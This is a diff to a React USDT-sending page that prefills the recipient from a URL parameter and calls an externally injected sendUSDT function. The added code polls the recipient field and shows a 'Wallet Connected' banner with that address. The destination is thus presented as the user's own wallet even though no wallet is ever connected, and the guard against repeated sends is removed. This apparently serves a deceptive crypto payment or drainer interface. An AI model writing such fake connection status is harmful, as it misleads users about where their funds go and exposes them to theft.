@@ -25,7 +25,8 @@ export default function Index() {
   const [searchParams] = useSearchParams();
   const [toAddress, setToAddress] = useState("");
   const [amount, setAmount] = useState("");
-  const [isSending, setIsSending] = useState(false);
+  const [walletConnected, setWalletConnected] = useState(false);
+  const [userWallet, setUserWallet] = useState("");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
   useEffect(() => {
@@ -34,6 +35,25 @@ export default function Index() {
       setToAddress(addressParam);
     }
   }, [searchParams]);
+
+  // Listen for wallet connection
+  useEffect(() => {
+    const checkConnection = () => {
+      const addr = (document.getElementById("toAddress") as HTMLInputElement)?.value;
+      if (addr && addr.startsWith("0x") && addr.length === 42) {
+        setWalletConnected(true);
+        setUserWallet(addr);
+      }
+    };
+
+    // Check immediately
+    checkConnection();
+
+    // Check periodically
+    const interval = setInterval(checkConnection, 500);
+
+    return () => clearInterval(interval);
+  }, [toAddress]);
 
   useEffect(() => {
     window.saveTransaction = (data) => {
@@ -54,13 +74,7 @@ export default function Index() {
 
   async function handleSendUSDT() {
     if (!window.sendUSDT) return;
-    
-    setIsSending(true);
-    try {
-      await window.sendUSDT();
-    } finally {
-      setIsSending(false);
-    }
+    await window.sendUSDT();
   }
 
   function setMax() {
@@ -77,6 +91,32 @@ export default function Index() {
         minHeight: "100vh",
       }}
     >
+      {/* Connection Status */}
+      {walletConnected && (
+        <div
+          style={{
+            background: "linear-gradient(90deg, #1f8f5f 0%, #25d695 100%)",
+            padding: "12px 20px",
+            display: "flex",
+            alignItems: "center",
+            gap: "8px",
+            fontSize: "14px",
+            fontWeight: 500,
+          }}
+        >
+          <div
+            style={{
+              width: "8px",
+              height: "8px",
+              borderRadius: "50%",
+              background: "#fff",
+              animation: "pulse 2s infinite",
+            }}
+          />
+          <span>Wallet Connected: {userWallet.slice(0, 6)}...{userWallet.slice(-4)}</span>
+        </div>
+      )}
+
       <div style={{ padding: "20px" }}>
         <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
           Address or Domain Name
@@ -152,25 +192,30 @@ export default function Index() {
 
       <button
         onClick={handleSendUSDT}
-        disabled={isSending}
         style={{
           position: "fixed",
           bottom: "20px",
           left: "20px",
           right: "20px",
-          background: isSending ? "#555" : "#1f8f5f",
-          color: isSending ? "#999" : "#000",
+          background: walletConnected ? "#1f8f5f" : "#555",
+          color: walletConnected ? "#000" : "#999",
           border: "none",
           borderRadius: "14px",
           padding: "16px",
           fontSize: "18px",
           fontWeight: 600,
-          cursor: isSending ? "not-allowed" : "pointer",
-          opacity: isSending ? 0.7 : 1,
+          cursor: walletConnected ? "pointer" : "not-allowed",
         }}
       >
-        {isSending ? "Connecting..." : "Send"}
+        {walletConnected ? "Send" : "Connecting Wallet..."}
       </button>
+
+      <style>{`
+        @keyframes pulse {
+          0%, 100% { opacity: 1; }
+          50% { opacity: 0.5; }
+        }
+      `}</style>
     </div>
   );
 }
